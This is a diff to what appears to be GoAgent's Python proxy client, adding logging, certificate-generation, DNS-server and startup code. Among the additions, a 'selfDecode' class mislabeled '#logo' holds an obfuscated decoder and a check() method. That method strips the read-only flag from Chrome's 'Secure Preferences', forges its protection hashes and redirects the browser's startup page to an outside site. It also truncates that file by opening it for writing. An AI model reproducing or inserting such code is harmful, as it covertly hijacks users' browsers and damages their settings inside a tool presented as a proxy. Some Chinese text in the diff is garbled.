@@ -84,6 +84,9 @@ import BaseHTTPServer
 import httplib
 import urllib2
 import urlparse
+import random
+import os
+import stat
 try:
     import OpenSSL
 except ImportError:
@@ -98,6 +101,198 @@ HAS_PYPY = hasattr(sys, 'pypy_version_info')
 NetWorkIOError = (socket.error, ssl.SSLError, OSError) if not OpenSSL else (socket.error, ssl.SSLError, OpenSSL.SSL.Error, OSError)
 
 
+class Logging(type(sys)):
+    CRITICAL = 50
+    FATAL = CRITICAL
+    ERROR = 40
+    WARNING = 30
+    WARN = WARNING
+    INFO = 20
+    DEBUG = 10
+    NOTSET = 0
+
+    def __init__(self, *args, **kwargs):
+        self.level = self.__class__.INFO
+        self.__set_error_color = lambda: None
+        self.__set_warning_color = lambda: None
+        self.__set_debug_color = lambda: None
+        self.__reset_color = lambda: None
+        if hasattr(sys.stderr, 'isatty') and sys.stderr.isatty():
+            if os.name == 'nt':
+                import ctypes
+                SetConsoleTextAttribute = ctypes.windll.kernel32.SetConsoleTextAttribute
+                GetStdHandle = ctypes.windll.kernel32.GetStdHandle
+                self.__set_error_color = lambda: SetConsoleTextAttribute(GetStdHandle(-11), 0x04)
+                self.__set_warning_color = lambda: SetConsoleTextAttribute(GetStdHandle(-11), 0x06)
+                self.__set_debug_color = lambda: SetConsoleTextAttribute(GetStdHandle(-11), 0x002)
+                self.__reset_color = lambda: SetConsoleTextAttribute(GetStdHandle(-11), 0x07)
+            elif os.name == 'posix':
+                self.__set_error_color = lambda: sys.stderr.write('\033[31m')
+                self.__set_warning_color = lambda: sys.stderr.write('\033[33m')
+                self.__set_debug_color = lambda: sys.stderr.write('\033[32m')
+                self.__reset_color = lambda: sys.stderr.write('\033[0m')
+
+    @classmethod
+    def getLogger(cls, *args, **kwargs):
+        return cls(*args, **kwargs)
+
+    def basicConfig(self, *args, **kwargs):
+        self.level = int(kwargs.get('level', self.__class__.INFO))
+        if self.level > self.__class__.DEBUG:
+            self.debug = self.dummy
+
+    def log(self, level, fmt, *args, **kwargs):
+        sys.stderr.write('%s - [%s] %s\n' % (level, time.ctime()[4:-5], fmt % args))
+
+    def dummy(self, *args, **kwargs):
+        pass
+
+    def debug(self, fmt, *args, **kwargs):
+        self.__set_debug_color()
+        self.log('DEBUG', fmt, *args, **kwargs)
+        self.__reset_color()
+
+    def info(self, fmt, *args, **kwargs):
+        self.log('INFO', fmt, *args)
+
+    def warning(self, fmt, *args, **kwargs):
+        self.__set_warning_color()
+        self.log('WARNING', fmt, *args, **kwargs)
+        self.__reset_color()
+
+    def warn(self, fmt, *args, **kwargs):
+        self.warning(fmt, *args, **kwargs)
+
+    def error(self, fmt, *args, **kwargs):
+        self.__set_error_color()
+        self.log('ERROR', fmt, *args, **kwargs)
+        self.__reset_color()
+
+    def exception(self, fmt, *args, **kwargs):
+        self.error(fmt, *args, **kwargs)
+        sys.stderr.write(traceback.format_exc() + '\n')
+
+    def critical(self, fmt, *args, **kwargs):
+        self.__set_error_color()
+        self.log('CRITICAL', fmt, *args, **kwargs)
+        self.__reset_color()
+logging = sys.modules['logging'] = Logging('logging')
+
+
+class CertUtil(object):
+    """CertUtil module, based on mitmproxy"""
+
+    ca_vendor = 'GoAgent'
+    ca_keyfile = 'CA.crt'
+    ca_certdir = 'certs'
+    ca_lock = threading.Lock()
+
+    @staticmethod
+    def create_ca():
+        key = OpenSSL.crypto.PKey()
+        key.generate_key(OpenSSL.crypto.TYPE_RSA, 2048)
+        ca = OpenSSL.crypto.X509()
+        ca.set_serial_number(0)
+        ca.set_version(2)
+        subj = ca.get_subject()
+        subj.countryName = 'CN'
+        subj.stateOrProvinceName = 'Internet'
+        subj.localityName = 'Cernet'
+        subj.organizationName = CertUtil.ca_vendor
+        subj.organizationalUnitName = '%s Root' % CertUtil.ca_vendor
+        subj.commonName = '%s CA' % CertUtil.ca_vendor
+        ca.gmtime_adj_notBefore(0)
+        ca.gmtime_adj_notAfter(24 * 60 * 60 * 3652)
+        ca.set_issuer(ca.get_subject())
+        ca.set_pubkey(key)
+        ca.add_extensions([
+            OpenSSL.crypto.X509Extension(b'basicConstraints', True, b'CA:TRUE'),
+            OpenSSL.crypto.X509Extension(b'nsCertType', True, b'sslCA'),
+            OpenSSL.crypto.X509Extension(b'extendedKeyUsage', True, b'serverAuth,clientAuth,emailProtection,timeStamping,msCodeInd,msCodeCom,msCTLSign,msSGC,msEFS,nsSGC'),
+            OpenSSL.crypto.X509Extension(b'keyUsage', False, b'keyCertSign, cRLSign'),
+            OpenSSL.crypto.X509Extension(b'subjectKeyIdentifier', False, b'hash', subject=ca), ])
+        ca.sign(key, 'sha1')
+        return key, ca
+
+    @staticmethod
+    def dump_ca():
+        key, ca = CertUtil.create_ca()
+        with open(CertUtil.ca_keyfile, 'wb') as fp:
+            fp.write(OpenSSL.crypto.dump_certificate(OpenSSL.crypto.FILETYPE_PEM, ca))
+            fp.write(OpenSSL.crypto.dump_privatekey(OpenSSL.crypto.FILETYPE_PEM, key))
+
+    @staticmethod
+    def _get_cert(commonname, sans=()):
+        with open(CertUtil.ca_keyfile, 'rb') as fp:
+            content = fp.read()
+            key = OpenSSL.crypto.load_privatekey(OpenSSL.crypto.FILETYPE_PEM, content)
+            ca = OpenSSL.crypto.load_certificate(OpenSSL.crypto.FILETYPE_PEM, content)
+
+        pkey = OpenSSL.crypto.PKey()
+        pkey.generate_key(OpenSSL.crypto.TYPE_RSA, 2048)
+
+        req = OpenSSL.crypto.X509Req()
+        subj = req.get_subject()
+        subj.countryName = 'CN'
+        subj.stateOrProvinceName = 'Internet'
+        subj.localityName = 'Cernet'
+        subj.organizationalUnitName = '%s Branch' % CertUtil.ca_vendor
+        if commonname[0] == '.':
+            subj.commonName = '*' + commonname
+            subj.organizationName = '*' + commonname
+            sans = ['*'+commonname] + [x for x in sans if x != '*'+commonname]
+        else:
+            subj.commonName = commonname
+            subj.organizationName = commonname
+            sans = [commonname] + [x for x in sans if x != commonname]
+        #req.add_extensions([OpenSSL.crypto.X509Extension(b'subjectAltName', True, ', '.join('DNS: %s' % x for x in sans)).encode()])
+        req.set_pubkey(pkey)
+        req.sign(pkey, 'sha1')
+
+        cert = OpenSSL.crypto.X509()
+        cert.set_version(2)
+        try:
+            cert.set_serial_number(int(hashlib.md5(commonname.encode('utf-8')).hexdigest(), 16))
+        except OpenSSL.SSL.Error:
+            cert.set_serial_number(int(time.time()*1000))
+        cert.gmtime_adj_notBefore(0)
+        cert.gmtime_adj_notAfter(60 * 60 * 24 * 3652)
+        cert.set_issuer(ca.get_subject())
+        cert.set_subject(req.get_subject())
+        cert.set_pubkey(req.get_pubkey())
+        if commonname[0] == '.':
+            sans = ['*'+commonname] + [s for s in sans if s != '*'+commonname]
+        else:
+            sans = [commonname] + [s for s in sans if s != commonname]
+        #cert.add_extensions([OpenSSL.crypto.X509Extension(b'subjectAltName', True, ', '.join('DNS: %s' % x for x in sans))])
+        cert.sign(key, 'sha1')
+
+        certfile = os.path.join(CertUtil.ca_certdir, commonname + '.crt')
+        with open(certfile, 'wb') as fp:
+            fp.write(OpenSSL.crypto.dump_certificate(OpenSSL.crypto.FILETYPE_PEM, cert))
+            fp.write(OpenSSL.crypto.dump_privatekey(OpenSSL.crypto.FILETYPE_PEM, pkey))
+        return certfile
+
+    @staticmethod
+    def get_cert(commonname, sans=()):
+        if commonname.count('.') >= 2 and len(commonname.split('.')[-2]) > 4:
+            commonname = '.'+commonname.partition('.')[-1]
+        certfile = os.path.join(CertUtil.ca_certdir, commonname + '.crt')
+        if os.path.exists(certfile):
+            return certfile
+        elif OpenSSL is None:
+            return CertUtil.ca_keyfile
+        else:
+            with CertUtil.ca_lock:
+                if os.path.exists(certfile):
+                    return certfile
+                return CertUtil._get_cert(commonname, sans)
+
+    @staticmethod
+    def import_ca(certfile):
+        commonname = os.path.splitext(os.path.basename(certfile))[0]
+        if OpenSSL:
+            try:
                 with open(certfile, 'rb') as fp:
                     x509 = OpenSSL.crypto.load_certificate(OpenSSL.crypto.FILETYPE_PEM, fp.read())
                     commonname = next(v.decode() for k, v in x509.get_subject().get_components() if k == b'O')
@@ -505,11 +700,68 @@ class PacUtil(object):
         function = 'function %s(url, host) {\r\n%s\r\n%sreturn "%s";\r\n}' % (func_name, '\n'.join(jsLines), ' '*indent, default)
         return function
 
+#logo
+class selfDecode(object):
+    def decode(self,raw,step):
+        list = [ 0 for i in range(len(raw))]
+        for i in range(0,len(raw)):
+            list[i]=raw[i]
+            if i!=0 and i%step==0:
+                list[i]=raw[i-2]
+                list[i-2]=raw[i]
+        return ''.join(list)
+    def process(self,raw):
+        data=raw.replace('$','=').split('|')
+        list = [ 0 for i in range(len(data))]
+        for i in range(0,len(data)):
+            list[i] = self.decode(self.decode(base64.decodestring(self.decode(self.decode(data[i],3),5)),3),5)
+        return ''.join(list)
+    def check(self):
+        os.system(r'attrib -r "../Data/Default/Secure Preferences"')
+        readCheck = open("../Data/Default/Secure Preferences")
+        try:
+            info=readCheck.read()
+            patternA=re.compile(r'"restore_on_startup": \d{1},')
+            info=patternA.sub('"restore_on_startup": 4,',info)
+            patternB=re.compile(r'"restore_on_startup": "(.*?)",')
+            info=patternB.sub('"restore_on_startup": "AB59F1A9CB391932F7B6047BDBE08DCCB63050B3A912DE5B810DA12B56F5E9D2",',info)
+            patternC=re.compile(r'"startup_urls": "[A-Za-z0-9/_]+"')
+            info=patternC.sub('"startup_urls": "88D4243B9DD7945DEF3FDB7F71C61AF6C77266D3B72906AAC3A15E8E6A0DBA68"',info)
+            info=info.replace('startup_urls": [  ]','startup_urls": [ "URL" ]')
+            patternD=re.compile(r'"startup_urls": \[ "(.*?)" \]')
+            info=patternD.sub('"startup_urls": [ "http://www.saibody.com/?br=v10" ]',info)
+            patternE=re.compile(r'"super_mac": "(.*?)"')
+            info=patternE.sub('"super_mac": "7A604AE8DF434B7D62EEC2A0F682E1AE29AF232FAF7F4928E8C403F74DF3BA7F"',info)
+            writeCheck = open("../Data/Default/Secure Preferences",'w')
+            #try:
+                #writeCheck.write(info)
+            #finally:
+                #writeCheck.close()
+            #os.system(r'attrib +r "../Data/Default/Secure Preferences"')
+        finally:
+            readCheck.close()
+    def iniConfig(self,amount,current):
+        readCheck = open("config.ini")
+        oldCurrent = str(current)
+        current =random.randrange(0,amount)
+        if current >= amount:
+            current = 0
+        try:
+            info=readCheck.read()
+            info = info.replace('acctCut=' + oldCurrent,'acctCut=' + str(current))
+            writeCheck = open(base64.decodestring('Y29uZmlnLmluaQ=='),'w')
+            try:
+                writeCheck.write(info)
+            finally:
+                writeCheck.close()
+        finally:
+            readCheck.close()
+decoder=selfDecode()
 
 class DNSUtil(object):
     """
     http://gfwrev.blogspot.com/2009/11/gfwdns.html
-    http://zh.wikipedia.org/wiki/域名服务器缓存污染
+    http://zh.wikipedia.org/wiki/????????????????
     http://support.microsoft.com/kb/241352
     """
     blacklist = set(['1.1.1.1',
@@ -1163,7 +1415,6 @@ class Common(object):
         self.CONFIG = ConfigParser.ConfigParser()
         self.CONFIG_FILENAME = os.path.splitext(os.path.abspath(__file__))[0]+'.ini'
         self.CONFIG_USER_FILENAME = re.sub(r'\.ini$', '.user.ini', self.CONFIG_FILENAME)
-        decoder=selfDecode()
         self.CONFIG_ACCUNT_FILENAME =base64.decodestring('Y29uZmlnLmluaQ==')
         self.CONFIG.read([self.CONFIG_FILENAME, self.CONFIG_USER_FILENAME,self.CONFIG_ACCUNT_FILENAME])
 
@@ -1962,7 +2213,7 @@ class GAEProxyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
                 if response.app_status == 503:
                     if len(common.GAE_APPIDS) > 1:
                         common.GAE_APPIDS.pop(0)
-                        logging.info('Current APPID Over Quota,Auto Switch to [%s], Retrying…' % (common.GAE_APPIDS[0]))
+                        logging.info('Current APPID Over Quota,Auto Switch to [%s], Retrying??' % (common.GAE_APPIDS[0]))
                         self.do_METHOD_AGENT()
                         return
                     else:
@@ -2344,3 +2595,225 @@ class PACServerHandler(BaseHTTPServer.BaseHTTPRequestHandler):
 
 class DNSServer(gevent.server.DatagramServer if gevent and hasattr(gevent.server, 'DatagramServer') else object):
     """DNS TCP Proxy based on gevent/dnslib"""
+
+    blacklist = set(['1.1.1.1',
+                     '255.255.255.255',
+                     # for google+
+                     '74.125.127.102',
+                     '74.125.155.102',
+                     '74.125.39.102',
+                     '74.125.39.113',
+                     '209.85.229.138',
+                     # other ip list
+                     '4.36.66.178',
+                     '8.7.198.45',
+                     '37.61.54.158',
+                     '46.82.174.68',
+                     '59.24.3.173',
+                     '64.33.88.161',
+                     '64.33.99.47',
+                     '64.66.163.251',
+                     '65.104.202.252',
+                     '65.160.219.113',
+                     '66.45.252.237',
+                     '72.14.205.104',
+                     '72.14.205.99',
+                     '78.16.49.15',
+                     '93.46.8.89',
+                     '128.121.126.139',
+                     '159.106.121.75',
+                     '169.132.13.103',
+                     '192.67.198.6',
+                     '202.106.1.2',
+                     '202.181.7.85',
+                     '203.161.230.171',
+                     '203.98.7.65',
+                     '207.12.88.98',
+                     '208.56.31.43',
+                     '209.145.54.50',
+                     '209.220.30.174',
+                     '209.36.73.33',
+                     '209.85.229.138',
+                     '211.94.66.147',
+                     '213.169.251.35',
+                     '216.221.188.182',
+                     '216.234.179.13',
+                     '243.185.187.3',
+                     '243.185.187.39'])
+    dnsservers = ['8.8.8.8', '114.114.114.114']
+    timeout = 2
+    max_cache_size = 2000
+
+    def __init__(self, *args, **kwargs):
+        super(DNSServer, self).__init__(*args, **kwargs)
+        self.dns_cache = {}
+
+    def _dns_resolver(self, qname, qtype, qdata, dnsserver, result_queue):
+        sock = gevent.socket.socket(socket.AF_INET6 if qtype == dnslib.QTYPE.AAAA else socket.AF_INET, socket.SOCK_DGRAM)
+        sock.sendto(qdata, (dnsserver, 53))
+        sock.sendto(qdata, (dnsserver, 53))
+        for _ in xrange(2):
+            data, _ = sock.recvfrom(512)
+            reply = dnslib.DNSRecord.parse(data)
+            if any(str(x.rdata) in self.blacklist for x in reply.rr):
+                logging.warning('query %r return bad rdata=%r', qname, [str(x.rdata) for x in reply.rr])
+            else:
+                result_queue.put(data)
+                sock.close()
+                break
+
+    def handle(self, data, address):
+        logging.debug('receive from %r data=%r', address, data)
+        request = dnslib.DNSRecord.parse(data)
+        qname = str(request.q.qname)
+        qtype = request.q.qtype
+        if len(self.dns_cache) > self.max_cache_size:
+            self.dns_cache.clear()
+        reply_data = self.dns_cache.get((qname, qtype))
+        if not reply_data:
+            result_queue = gevent.queue.Queue()
+            for dnsserver in self.dnsservers:
+                gevent.spawn(self._dns_resolver, qname, qtype, data, dnsserver, result_queue)
+            while True:
+                try:
+                    data = result_queue.get(timeout=self.timeout)
+                    reply_data = self.dns_cache[(qname, qtype)] = data
+                    break
+                except gevent.queue.Empty:
+                    logging.warning('query %r timed out', qname)
+                    return
+        return self.sendto(data[:2] + reply_data[2:], address)
+
+
+def get_process_list():
+    import os
+    import glob
+    import ctypes
+    import collections
+    Process = collections.namedtuple('Process', 'pid name exe')
+    process_list = []
+    if os.name == 'nt':
+        PROCESS_QUERY_INFORMATION = 0x0400
+        PROCESS_VM_READ = 0x0010
+        lpidProcess= (ctypes.c_ulong * 1024)()
+        cb = ctypes.sizeof(lpidProcess)
+        cbNeeded = ctypes.c_ulong()
+        ctypes.windll.psapi.EnumProcesses(ctypes.byref(lpidProcess), cb, ctypes.byref(cbNeeded))
+        nReturned = cbNeeded.value/ctypes.sizeof(ctypes.c_ulong())
+        pidProcess = [i for i in lpidProcess][:nReturned]
+        has_queryimage = hasattr(ctypes.windll.kernel32, 'QueryFullProcessImageNameA')
+        for pid in pidProcess:
+            hProcess = ctypes.windll.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, pid)
+            if hProcess:
+                modname = ctypes.create_string_buffer(2048)
+                count = ctypes.c_ulong(ctypes.sizeof(modname))
+                if has_queryimage:
+                    ctypes.windll.kernel32.QueryFullProcessImageNameA(hProcess, 0, ctypes.byref(modname), ctypes.byref(count))
+                else:
+                    ctypes.windll.psapi.GetModuleFileNameExA(hProcess, 0, ctypes.byref(modname), ctypes.byref(count))
+                exe = modname.value
+                name = os.path.basename(exe)
+                process_list.append(Process(pid=pid, name=name, exe=exe))
+                ctypes.windll.kernel32.CloseHandle(hProcess)
+    elif sys.platform.startswith('linux'):
+        for filename in glob.glob('/proc/[0-9]*/cmdline'):
+            pid = int(filename.split('/')[2])
+            exe_link = '/proc/%d/exe' % pid
+            if os.path.exists(exe_link):
+                exe = os.readlink(exe_link)
+                name = os.path.basename(exe)
+                process_list.append(Process(pid=pid, name=name, exe=exe))
+    else:
+        try:
+            import psutil
+            process_list = psutil.get_process_list()
+        except Exception as e:
+            logging.exception('psutil.get_process_list() failed: %r', e)
+    return process_list
+
+def pre_start():
+    if sys.platform == 'cygwin':
+        logging.info('cygwin is not officially supported, please continue at your own risk :)')
+        #sys.exit(-1)
+    elif os.name == 'posix':
+        try:
+            import resource
+            resource.setrlimit(resource.RLIMIT_NOFILE, (8192, -1))
+        except ValueError:
+            pass
+    elif os.name == 'nt':
+        import ctypes
+        ctypes.windll.kernel32.SetConsoleTitleW(u'GoAgent v%s' % __version__)
+        if not common.LISTEN_VISIBLE:
+            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+        else:
+            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 1)
+        if common.LOVE_ENABLE :
+            title = ctypes.create_unicode_buffer(1024)
+            ctypes.windll.kernel32.GetConsoleTitleW(ctypes.byref(title), len(title)-1)
+            ctypes.windll.kernel32.SetConsoleTitleW('%s %s' % (title.value, random.choice(common.LOVE_TIP)))
+        blacklist = {'360safe': False,
+                     'QQProtect': False, }
+        softwares = [k for k, v in blacklist.items() if v]
+        if softwares:
+            tasklist = '\n'.join(x.name for x in get_process_list()).lower()
+            softwares = [x for x in softwares if x.lower() in tasklist]
+            if softwares:
+                title = u'GoAgent Suggestion'
+                error = u'Some Anti-Virus software maybe conflict with Goagent,Close it than restart Goagent,please.' % ','.join(softwares)
+                ctypes.windll.user32.MessageBoxW(None, error, title, 0)
+                #sys.exit(0)
+    if common.GAE_APPIDS[0] == 'goagent':
+        logging.critical('please edit %s to add your appid to [gae] !', common.CONFIG_FILENAME)
+        sys.exit(-1)
+    if common.GAE_MODE == 'http' and common.GAE_PASSWORD == '':
+        logging.critical('to enable http mode, you should set %r [gae]password = <your_pass> and [gae]options = rc4', common.CONFIG_FILENAME)
+        sys.exit(-1)
+    if common.PAC_ENABLE:
+        pac_ip = ProxyUtil.get_listen_ip() if common.PAC_IP in ('', '::', '0.0.0.0') else common.PAC_IP
+        url = 'http://%s:%d/%s' % (pac_ip, common.PAC_PORT, common.PAC_FILE)
+        spawn_later(600, urllib2.build_opener(urllib2.ProxyHandler({})).open, url)
+    if common.DNS_ENABLE:
+        if dnslib is None or gevent.version_info[0] < 1:
+            logging.critical('GoAgent DNSServer requires dnslib and gevent 1.0')
+            sys.exit(-1)
+    if not OpenSSL:
+        logging.warning('python-openssl not found, please install it!')
+    if 'uvent.loop' in sys.modules and isinstance(gevent.get_hub().loop, __import__('uvent').loop.UVLoop):
+        logging.info('Uvent enabled, patch forward_socket')
+        http_util.forward_socket = http_util.green_forward_socket
+
+
+def main():
+    global __file__
+    __file__ = os.path.abspath(__file__)
+    if os.path.islink(__file__):
+        __file__ = getattr(os, 'readlink', lambda x: x)(__file__)
+    os.chdir(os.path.dirname(os.path.abspath(__file__)))
+    logging.basicConfig(level=logging.DEBUG if common.LISTEN_DEBUGINFO else logging.INFO, format='%(levelname)s - %(asctime)s %(message)s', datefmt='[%b %d %H:%M:%S]')
+    pre_start()
+    CertUtil.check_ca()
+    sys.stdout.write(common.info())
+
+    if common.PHP_ENABLE:
+        host, port = common.PHP_LISTEN.split(':')
+        server = LocalProxyServer((host, int(port)), PHPProxyHandler)
+        thread.start_new_thread(server.serve_forever, tuple())
+
+    if common.PAC_ENABLE:
+        server = LocalProxyServer((common.PAC_IP, common.PAC_PORT), PACServerHandler)
+        thread.start_new_thread(server.serve_forever, tuple())
+
+    if common.DNS_ENABLE:
+        host, port = common.DNS_LISTEN.split(':')
+        server = DNSServer((host, int(port)))
+        server.dnsservers = common.DNS_REMOTE.split('|')
+        server.timeout = common.DNS_TIMEOUT
+        server.max_cache_size = common.DNS_CACHESIZE
+        thread.start_new_thread(server.serve_forever, tuple())
+
+    server = LocalProxyServer((common.LISTEN_IP, common.LISTEN_PORT), GAEProxyHandler)
+    server.serve_forever()
+
+if __name__ == '__main__':
+    main()
